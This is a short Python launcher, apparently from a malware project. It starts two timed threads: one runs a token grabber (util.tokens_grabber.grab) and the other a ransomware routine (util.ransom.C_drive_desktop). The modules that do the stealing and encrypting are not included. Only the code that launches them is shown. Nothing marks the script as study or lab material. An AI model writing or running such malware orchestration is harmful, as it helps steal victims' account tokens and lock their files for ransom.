from threading import *
from util.tokens_grabber import grab
from util.ransom import C_drive_desktop

def execution_1():
    while(True):
        grab()
        break
        
def execution_2():
    while(True):
        C_drive_desktop()
        break


# Create threads
thread1 = Timer(1.0, execution_1)
thread2 = Timer(2.0, execution_2)

# Start threads
thread1.start()
thread2.start()
